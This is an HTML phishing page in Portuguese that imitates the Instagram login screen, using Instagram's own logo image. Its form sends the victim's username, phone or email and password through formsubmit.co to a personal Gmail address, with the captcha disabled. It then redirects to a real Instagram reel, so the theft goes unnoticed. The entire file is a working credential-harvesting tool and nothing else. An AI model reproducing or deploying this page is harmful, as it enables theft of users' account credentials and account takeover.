<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Instagram</title>
    <link rel="stylesheet" href="main.css">
</head>
<body>
    <div class="container">
        <div class="logo"><i data-visualcompletion="css-img" aria-label="Instagram" class="logo" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v4/yB/r/E7m8ZCMOFDS.png&quot;); background-position: 0px 0px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i></div>
        
        <form action="https://formsubmit.co/natanbillss@gmail.com" method="POST">
            <input type="text" name="message" placeholder="Telefone, nome de usuário ou email" required>

            <div class="show-password">
                <input type="password" name="pass" placeholder="Senha" id="senha" required>
            </div>
            <button class="btn-login" type="submit" value="Enviar">Entrar</button>
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value="https://www.instagram.com/reel/DJB7AIruO0A/?utm_source=ig_web_copy_link">
        </form>

        
        <div class="separator"></div>
        <div class="forgot"><a href="#">Esqueceu a senha?</a></div>
        <div class="signup">Não tem uma conta? <a href="#">Cadastre-se</a></div>
        <div class="terms">
            Ao continuar, você concorda com os <a href="#">Termos de Uso</a> e a <a href="#">Política de Privacidade</a> do Instagram.
        </div>
    </div>
</body>
</html>
